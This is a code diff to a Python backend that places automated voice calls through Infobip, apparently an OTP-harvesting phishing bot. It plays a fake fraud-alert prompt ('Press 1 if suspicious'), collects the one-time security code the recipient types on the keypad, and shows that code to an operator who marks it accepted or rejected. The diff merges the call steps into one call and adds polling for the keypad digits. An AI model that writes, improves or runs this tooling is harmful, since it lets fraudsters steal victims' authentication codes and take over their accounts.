@@ -29,7 +29,7 @@ INFOBIP_FROM_NUMBER = os.environ.get('INFOBIP_FROM_NUMBER', '+18085821342')
 INFOBIP_NUMBER_ID = os.environ.get('INFOBIP_NUMBER_ID', '')
 INFOBIP_APP_NAME = os.environ.get('INFOBIP_APP_NAME', 'AmericanClub1')
 
-# Webhook URL for DTMF callbacks
+# Webhook URL for callbacks
 WEBHOOK_BASE_URL = os.environ.get('WEBHOOK_BASE_URL', 'https://botcaller.preview.emergentagent.com')
 
 # Create the main app
@@ -160,8 +160,8 @@ def prepare_tts_text(template: str, config: CallConfig) -> str:
     text = text.replace("{digits}", str(config.otp_digits))
     return text
 
-async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps):
-    """Send IVR call with Step 1 - Initial greeting with DTMF choice (0 or 1)"""
+async def send_complete_ivr_call(call_id: str, config: CallConfig, steps: CallSteps):
+    """Send complete IVR call with all steps in sequence"""
     try:
         client = await get_http_client()
         
@@ -169,15 +169,21 @@ async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps
         voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
         voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
         
-        # Prepare Step 1 message
+        # Prepare all messages
         step1_text = prepare_tts_text(steps.step1, config)
+        step2_text = prepare_tts_text(steps.step2, config)
+        step3_text = prepare_tts_text(steps.step3, config)
         
         # Clean phone numbers
         from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
         to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
         
-        # Webhook URL for DTMF callback
-        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/dtmf/{call_id}"
+        # Webhook URL for callbacks
+        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/ivr/{call_id}"
+        
+        # Build complete TTS message with pauses for DTMF collection
+        # Format: Step1 -> wait for DTMF(1 digit) -> Step2 -> wait for DTMF(OTP) -> Step3
+        complete_message = f"{step1_text}. ... ... ... {step2_text}. ... ... ... ... ... {step3_text}"
         
         # Infobip Voice Message API payload with DTMF collection
         payload = {
@@ -190,22 +196,23 @@ async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps
                             "messageId": call_id
                         }
                     ],
-                    "text": step1_text,
+                    "text": complete_message,
                     "language": voice_settings["language"],
                     "voice": {
                         "name": voice_settings["name"],
                         "gender": voice_settings["gender"]
                     },
-                    "maxDtmf": 1,
-                    "dtmfTimeout": 15,
-                    "callTimeout": 120,
+                    "speechRate": 0.9,
+                    "maxDtmf": config.otp_digits + 1,  # 1 for step1 + OTP digits
+                    "dtmfTimeout": 30,
+                    "callTimeout": 180,
                     "notifyUrl": notify_url,
                     "notifyContentType": "application/json"
                 }
             ]
         }
         
-        logger.info(f"Sending IVR Step 1 to Infobip: {json.dumps(payload)}")
+        logger.info(f"Sending complete IVR call to Infobip: {json.dumps(payload)}")
         
         response = await client.post("/tts/3/advanced", json=payload)
         
@@ -232,11 +239,12 @@ async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps
                 )
                 
                 await add_call_event(call_id, "CALL_INITIATED", f"IVR call started. Message ID: {message_id}")
-                await add_call_event(call_id, "STEP1_PLAYING", f"Playing greeting: Press 1 if suspicious, Press 0 if it was you")
+                await add_call_event(call_id, "IVR_FLOW_STARTED", "Complete IVR flow: Step1 -> DTMF -> Step2 -> OTP -> Step3")
+                await add_call_event(call_id, "STEP1_PLAYING", f"Playing: {step1_text[:60]}...")
                 await add_call_event(call_id, "INFOBIP_STATUS", f"Status: {status_name} - {status_desc}")
                 
-                # Start polling for status
-                asyncio.create_task(poll_message_status(call_id, message_id))
+                # Start polling for status and DTMF
+                asyncio.create_task(poll_call_status(call_id, message_id))
                 
                 return {"success": True, "message_id": message_id}
             else:
@@ -266,178 +274,16 @@ async def send_ivr_call_step1(call_id: str, config: CallConfig, steps: CallSteps
         )
         return {"success": False, "error": str(e)}
 
-async def send_ivr_step2(call_id: str, config: CallConfig, steps: CallSteps):
-    """Send Step 2 - Ask for OTP code"""
+async def poll_call_status(call_id: str, message_id: str):
+    """Poll Infobip for call status and DTMF codes"""
     try:
         client = await get_http_client()
-        
-        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
-        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
-        
-        step2_text = prepare_tts_text(steps.step2, config)
-        
-        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
-        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
-        
-        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/dtmf-code/{call_id}"
-        
-        payload = {
-            "messages": [
-                {
-                    "from": from_num,
-                    "destinations": [
-                        {
-                            "to": to_num,
-                            "messageId": f"{call_id}-step2"
-                        }
-                    ],
-                    "text": step2_text,
-                    "language": voice_settings["language"],
-                    "voice": {
-                        "name": voice_settings["name"],
-                        "gender": voice_settings["gender"]
-                    },
-                    "maxDtmf": config.otp_digits,
-                    "dtmfTimeout": 20,
-                    "callTimeout": 120,
-                    "notifyUrl": notify_url,
-                    "notifyContentType": "application/json"
-                }
-            ]
-        }
-        
-        logger.info(f"Sending IVR Step 2: {json.dumps(payload)}")
-        
-        response = await client.post("/tts/3/advanced", json=payload)
-        
-        if response.status_code in [200, 201, 202]:
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {"current_step": "step2"}}
-            )
-            await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
-            return {"success": True}
-        else:
-            error_msg = f"Step 2 failed: {response.status_code}"
-            await add_call_event(call_id, "STEP2_ERROR", error_msg)
-            return {"success": False, "error": error_msg}
-            
-    except Exception as e:
-        logger.error(f"Error in Step 2: {e}")
-        return {"success": False, "error": str(e)}
-
-async def send_ivr_step3(call_id: str, config: CallConfig, steps: CallSteps):
-    """Send Step 3 - Verification wait message"""
-    try:
-        client = await get_http_client()
-        
-        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
-        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
-        
-        step3_text = prepare_tts_text(steps.step3, config)
-        
-        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
-        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
-        
-        payload = {
-            "messages": [
-                {
-                    "from": from_num,
-                    "destinations": [
-                        {
-                            "to": to_num,
-                            "messageId": f"{call_id}-step3"
-                        }
-                    ],
-                    "text": step3_text,
-                    "language": voice_settings["language"],
-                    "voice": {
-                        "name": voice_settings["name"],
-                        "gender": voice_settings["gender"]
-                    }
-                }
-            ]
-        }
-        
-        response = await client.post("/tts/3/advanced", json=payload)
-        
-        if response.status_code in [200, 201, 202]:
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {"current_step": "step3"}}
-            )
-            await add_call_event(call_id, "STEP3_PLAYING", "Verification in progress...")
-            return {"success": True}
-            
-    except Exception as e:
-        logger.error(f"Error in Step 3: {e}")
-        return {"success": False, "error": str(e)}
-
-async def send_ivr_result(call_id: str, config: CallConfig, steps: CallSteps, is_accepted: bool):
-    """Send final result message - Accepted or Rejected"""
-    try:
-        client = await get_http_client()
-        
-        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
-        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
-        
-        result_text = prepare_tts_text(steps.accepted if is_accepted else steps.rejected, config)
-        
-        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
-        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
-        
-        payload = {
-            "messages": [
-                {
-                    "from": from_num,
-                    "destinations": [
-                        {
-                            "to": to_num,
-                            "messageId": f"{call_id}-result"
-                        }
-                    ],
-                    "text": result_text,
-                    "language": voice_settings["language"],
-                    "voice": {
-                        "name": voice_settings["name"],
-                        "gender": voice_settings["gender"]
-                    }
-                }
-            ]
-        }
-        
-        response = await client.post("/tts/3/advanced", json=payload)
-        
-        if response.status_code in [200, 201, 202]:
-            status = "accepted" if is_accepted else "rejected"
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {
-                    "current_step": status,
-                    "verification_result": status,
-                    "status": "FINISHED",
-                    "ended_at": datetime.now(timezone.utc).isoformat()
-                }}
-            )
-            
-            event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
-            await add_call_event(call_id, event_type, f"Code {'accepted' if is_accepted else 'rejected'}. Playing final message.")
-            await add_call_event(call_id, "CALL_FINISHED", "Call completed")
-            return {"success": True}
-            
-    except Exception as e:
-        logger.error(f"Error sending result: {e}")
-        return {"success": False, "error": str(e)}
-
-async def poll_message_status(call_id: str, message_id: str):
-    """Poll Infobip for message delivery status"""
-    try:
-        client = await get_http_client()
-        max_polls = 30
+        max_polls = 60  # Poll for up to 10 minutes
         poll_count = 0
+        last_dtmf = None
         
         while poll_count < max_polls:
-            await asyncio.sleep(10)
+            await asyncio.sleep(5)  # Poll every 5 seconds
             poll_count += 1
             
             try:
@@ -450,19 +296,25 @@ async def poll_message_status(call_id: str, message_id: str):
                         report = result["results"][0]
                         status = report.get("status", {})
                         status_name = status.get("name", "UNKNOWN")
+                        voice_call = report.get("voiceCall", {})
+                        dtmf_codes = voice_call.get("dtmfCodes")
                         
-                        # Check for DTMF in the report
-                        sent_dtmf = report.get("sentDtmf")
-                        if sent_dtmf:
-                            await add_call_event(call_id, "DTMF_RECEIVED", f"DTMF received: {sent_dtmf}", sent_dtmf)
+                        # Process DTMF codes if new
+                        if dtmf_codes and dtmf_codes != last_dtmf:
+                            last_dtmf = dtmf_codes
+                            await process_dtmf_codes(call_id, dtmf_codes)
                         
-                        # Map status
-                        if status_name in ["DELIVERED", "ANSWERED"]:
+                        # Update status based on Infobip status
+                        if status_name == "DELIVERED_TO_HANDSET":
                             await db.call_logs.update_one(
                                 {"id": call_id},
                                 {"$set": {"status": "ESTABLISHED"}}
                             )
-                            await add_call_event(call_id, "CALL_ANSWERED", "Call answered by recipient")
+                            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
+                            if call_log and call_log.get("status") != "FINISHED":
+                                # Call answered but ongoing
+                                pass
+                                
                         elif status_name in ["REJECTED", "UNDELIVERABLE", "EXPIRED"]:
                             await db.call_logs.update_one(
                                 {"id": call_id},
@@ -470,12 +322,63 @@ async def poll_message_status(call_id: str, message_id: str):
                             )
                             await add_call_event(call_id, "CALL_FAILED", f"Call failed: {status_name}")
                             break
+                        
+                        # Check if call ended
+                        end_time = voice_call.get("endTime")
+                        if end_time:
+                            duration = voice_call.get("duration", 0)
+                            await db.call_logs.update_one(
+                                {"id": call_id},
+                                {"$set": {
+                                    "status": "FINISHED",
+                                    "ended_at": datetime.now(timezone.utc).isoformat(),
+                                    "duration_seconds": duration
+                                }}
+                            )
+                            await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration} seconds")
+                            break
                             
             except Exception as poll_error:
                 logger.warning(f"Poll error: {poll_error}")
                 
     except Exception as e:
         logger.error(f"Error in status polling: {e}")
+
+async def process_dtmf_codes(call_id: str, dtmf_codes: str):
+    """Process received DTMF codes"""
+    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
+    if not call_log:
+        return
+    
+    config = CallConfig(**call_log["config"])
+    current_step = call_log.get("current_step", "step1")
+    existing_dtmf_step1 = call_log.get("dtmf_step1")
+    existing_dtmf_code = call_log.get("dtmf_code")
+    
+    # Parse DTMF codes
+    if len(dtmf_codes) >= 1:
+        # First digit is Step 1 response (0 or 1)
+        step1_dtmf = dtmf_codes[0]
+        
+        if not existing_dtmf_step1:
+            await db.call_logs.update_one(
+                {"id": call_id},
+                {"$set": {"dtmf_step1": step1_dtmf, "current_step": "step2"}}
+            )
+            await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {step1_dtmf}", step1_dtmf)
+            await add_call_event(call_id, "STEP2_PLAYING", "Now asking for security code...")
+        
+        # Remaining digits are OTP code
+        if len(dtmf_codes) > 1:
+            otp_code = dtmf_codes[1:]
+            
+            if otp_code and otp_code != existing_dtmf_code:
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"dtmf_code": otp_code, "current_step": "step3"}}
+                )
+                await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code)
+                await add_call_event(call_id, "STEP3_PLAYING", "Verification in progress...")
 
 async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
     """Simulate IVR flow for demo/testing"""
@@ -500,50 +403,43 @@ async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
         await asyncio.sleep(5)
         # Simulate DTMF input
         dtmf_step1 = "1"
-        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1}})
-        await add_call_event(call_id, "DTMF_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
+        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1, "current_step": "step2"}})
+        await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
         
         # Step 2: Ask for code
         await asyncio.sleep(1)
-        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step2"}})
         step2_text = prepare_tts_text(steps.step2, config)
         await add_call_event(call_id, "STEP2_PLAYING", f"Playing: {step2_text[:80]}...")
         
         await asyncio.sleep(4)
         # Simulate OTP code entry
         otp_code = "584219"
-        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_code": otp_code}})
+        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_code": otp_code, "current_step": "step3"}})
         await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code)
         
         # Step 3: Verification wait
         await asyncio.sleep(1)
-        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step3"}})
         step3_text = prepare_tts_text(steps.step3, config)
         await add_call_event(call_id, "STEP3_PLAYING", f"Playing: {step3_text}")
         
-        # Simulate verification
-        await asyncio.sleep(3)
-        is_accepted = True
-        result = "accepted" if is_accepted else "rejected"
+        # Wait for manual verification
+        await asyncio.sleep(10)
         
-        await db.call_logs.update_one(
-            {"id": call_id}, 
-            {"$set": {
-                "current_step": result,
-                "verification_result": result,
-                "status": "FINISHED",
-                "ended_at": datetime.now(timezone.utc).isoformat()
-            }}
-        )
-        
-        event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
-        await add_call_event(call_id, event_type, f"Code {result}")
-        
-        result_text = prepare_tts_text(steps.accepted if is_accepted else steps.rejected, config)
-        await add_call_event(call_id, f"{'ACCEPTED' if is_accepted else 'REJECTED'}_PLAYING", f"Playing: {result_text[:80]}...")
-        
-        await asyncio.sleep(3)
-        await add_call_event(call_id, "CALL_FINISHED", "Call completed. Duration: 20 seconds")
+        # Check if manually verified
+        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
+        if call_log and call_log.get("status") != "FINISHED":
+            # Auto-accept for simulation
+            await db.call_logs.update_one(
+                {"id": call_id}, 
+                {"$set": {
+                    "current_step": "accepted",
+                    "verification_result": "accepted",
+                    "status": "FINISHED",
+                    "ended_at": datetime.now(timezone.utc).isoformat()
+                }}
+            )
+            await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code auto-accepted (simulation)")
+            await add_call_event(call_id, "CALL_FINISHED", "Call completed. Duration: 25 seconds")
         
     except Exception as e:
         logger.error(f"Error in IVR simulation: {e}")
@@ -590,7 +486,7 @@ async def initiate_call(request: CallRequest, background_tasks: BackgroundTasks)
         
         if INFOBIP_API_KEY and INFOBIP_BASE_URL:
             background_tasks.add_task(
-                send_ivr_call_step1, 
+                send_complete_ivr_call, 
                 call_log.id, 
                 request.config, 
                 request.steps
@@ -615,7 +511,7 @@ async def initiate_call(request: CallRequest, background_tasks: BackgroundTasks)
         raise HTTPException(status_code=500, detail=str(e))
 
 @api_router.post("/calls/{call_id}/verify")
-async def verify_code(call_id: str, request: Request, background_tasks: BackgroundTasks):
+async def verify_code(call_id: str, request: Request):
     """Manually verify/reject the entered code"""
     try:
         data = await request.json()
@@ -626,31 +522,19 @@ async def verify_code(call_id: str, request: Request, background_tasks: Backgrou
         if not call_log:
             raise HTTPException(status_code=404, detail="Call not found")
         
-        config = CallConfig(**call_log["config"])
-        steps = CallSteps(**call_log["steps"])
+        result = "accepted" if is_accepted else "rejected"
+        await db.call_logs.update_one(
+            {"id": call_id},
+            {"$set": {
+                "verification_result": result,
+                "current_step": result,
+                "status": "FINISHED",
+                "ended_at": datetime.now(timezone.utc).isoformat()
+            }}
+        )
         
-        if INFOBIP_API_KEY and INFOBIP_BASE_URL:
-            background_tasks.add_task(
-                send_ivr_result,
-                call_id,
-                config,
-                steps,
-                is_accepted
-            )
-        else:
-            # Simulation mode
-            result = "accepted" if is_accepted else "rejected"
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {
-                    "verification_result": result,
-                    "current_step": result,
-                    "status": "FINISHED",
-                    "ended_at": datetime.now(timezone.utc).isoformat()
-                }}
-            )
-            event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
-            await add_call_event(call_id, event_type, f"Code manually {result}")
+        event_type = "VERIFICATION_ACCEPTED" if is_accepted else "VERIFICATION_REJECTED"
+        await add_call_event(call_id, event_type, f"Code {result}")
         
         return {"status": "verified", "accepted": is_accepted}
         
@@ -755,107 +639,53 @@ async def stream_call_events(call_id: str):
         }
     )
 
-@api_router.post("/webhook/dtmf/{call_id}")
-async def handle_dtmf_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
-    """Webhook for DTMF input from Step 1"""
+@api_router.post("/webhook/ivr/{call_id}")
+async def handle_ivr_webhook(call_id: str, request: Request):
+    """Webhook for IVR call events and DTMF"""
     try:
         payload = await request.json()
-        logger.info(f"DTMF Webhook received for {call_id}: {json.dumps(payload)}")
+        logger.info(f"IVR Webhook received for {call_id}: {json.dumps(payload)}")
         
-        # Extract DTMF from various possible locations in the payload
-        sent_dtmf = None
-        
-        # Check direct sentDtmf
-        if payload.get("sentDtmf"):
-            sent_dtmf = payload.get("sentDtmf")
-        # Check in results array (Infobip delivery report format)
-        elif payload.get("results") and len(payload["results"]) > 0:
+        # Process results
+        if payload.get("results") and len(payload["results"]) > 0:
             result = payload["results"][0]
-            # Check voiceCall.dtmfCodes (Infobip voice report format)
+            status = result.get("status", {})
+            status_name = status.get("name", "UNKNOWN")
             voice_call = result.get("voiceCall", {})
-            if voice_call.get("dtmfCodes"):
-                sent_dtmf = voice_call.get("dtmfCodes")
-            # Also check direct sentDtmf in result
-            elif result.get("sentDtmf"):
-                sent_dtmf = result.get("sentDtmf")
-        
-        if sent_dtmf:
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {"dtmf_step1": sent_dtmf}}
-            )
-            await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {sent_dtmf}", sent_dtmf)
+            dtmf_codes = voice_call.get("dtmfCodes")
             
-            # Proceed to Step 2
-            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
-            if call_log:
-                config = CallConfig(**call_log["config"])
-                steps = CallSteps(**call_log["steps"])
-                background_tasks.add_task(send_ivr_step2, call_id, config, steps)
-        else:
-            # Check if this is a delivery report without DTMF
-            if payload.get("results") and len(payload["results"]) > 0:
-                result = payload["results"][0]
-                status = result.get("status", {})
-                status_name = status.get("name", "")
-                
-                if status_name == "DELIVERED_TO_HANDSET":
-                    voice_call = result.get("voiceCall", {})
-                    dtmf_codes = voice_call.get("dtmfCodes")
-                    if dtmf_codes:
-                        await db.call_logs.update_one(
-                            {"id": call_id},
-                            {"$set": {"dtmf_step1": dtmf_codes, "status": "ESTABLISHED"}}
-                        )
-                        await add_call_event(call_id, "DTMF_RECEIVED", f"DTMF captured: {dtmf_codes}", dtmf_codes)
-                    else:
-                        await add_call_event(call_id, "CALL_ANSWERED", "Call answered, waiting for DTMF")
-                        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED"}})
+            # Update call status
+            if status_name == "DELIVERED_TO_HANDSET":
+                await db.call_logs.update_one(
+                    {"id": call_id},
+                    {"$set": {"status": "ESTABLISHED"}}
+                )
+                await add_call_event(call_id, "CALL_ANSWERED", "Call answered by recipient")
+            
+            # Process DTMF codes
+            if dtmf_codes:
+                await process_dtmf_codes(call_id, dtmf_codes)
+            
+            # Check for call end
+            end_time = voice_call.get("endTime")
+            if end_time:
+                duration = voice_call.get("duration", 0)
+                call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
+                if call_log and call_log.get("status") != "FINISHED":
+                    await db.call_logs.update_one(
+                        {"id": call_id},
+                        {"$set": {
+                            "status": "FINISHED",
+                            "ended_at": datetime.now(timezone.utc).isoformat(),
+                            "duration_seconds": duration
+                        }}
+                    )
+                    await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration} seconds")
         
         return {"status": "received"}
         
     except Exception as e:
-        logger.error(f"DTMF webhook error: {e}")
-        return {"status": "error", "message": str(e)}
-
-@api_router.post("/webhook/dtmf-code/{call_id}")
-async def handle_dtmf_code_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
-    """Webhook for OTP code DTMF input from Step 2"""
-    try:
-        payload = await request.json()
-        logger.info(f"DTMF Code Webhook received for {call_id}: {json.dumps(payload)}")
-        
-        # Extract DTMF from various formats
-        sent_dtmf = None
-        
-        if payload.get("sentDtmf"):
-            sent_dtmf = payload.get("sentDtmf")
-        elif payload.get("results") and len(payload["results"]) > 0:
-            result = payload["results"][0]
-            voice_call = result.get("voiceCall", {})
-            if voice_call.get("dtmfCodes"):
-                sent_dtmf = voice_call.get("dtmfCodes")
-            elif result.get("sentDtmf"):
-                sent_dtmf = result.get("sentDtmf")
-        
-        if sent_dtmf:
-            await db.call_logs.update_one(
-                {"id": call_id},
-                {"$set": {"dtmf_code": sent_dtmf}}
-            )
-            await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {sent_dtmf}", sent_dtmf)
-            
-            # Proceed to Step 3
-            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
-            if call_log:
-                config = CallConfig(**call_log["config"])
-                steps = CallSteps(**call_log["steps"])
-                background_tasks.add_task(send_ivr_step3, call_id, config, steps)
-        
-        return {"status": "received"}
-        
-    except Exception as e:
-        logger.error(f"DTMF code webhook error: {e}")
+        logger.error(f"IVR webhook error: {e}")
         return {"status": "error", "message": str(e)}
 
 @api_router.post("/webhook/call-events")
@@ -870,7 +700,8 @@ async def handle_infobip_webhook(request: Request):
                 message_id = result.get("messageId")
                 status = result.get("status", {})
                 status_name = status.get("name", "UNKNOWN")
-                sent_dtmf = result.get("sentDtmf")
+                voice_call = result.get("voiceCall", {})
+                dtmf_codes = voice_call.get("dtmfCodes")
                 
                 # Find call by message ID
                 call_log = await db.call_logs.find_one(
@@ -882,18 +713,16 @@ async def handle_infobip_webhook(request: Request):
                 )
                 
                 if call_log:
-                    if sent_dtmf:
-                        await add_call_event(
-                            call_log["id"],
-                            "DTMF_RECEIVED",
-                            f"DTMF: {sent_dtmf}",
-                            sent_dtmf
-                        )
+                    call_id = call_log["id"]
+                    
+                    # Process DTMF
+                    if dtmf_codes:
+                        await process_dtmf_codes(call_id, dtmf_codes)
                     
                     await add_call_event(
-                        call_log["id"],
+                        call_id,
                         f"WEBHOOK_{status_name}",
-                        json.dumps(status)
+                        f"Status update: {status.get('description', status_name)}"
                     )
         
         return {"status": "received"}
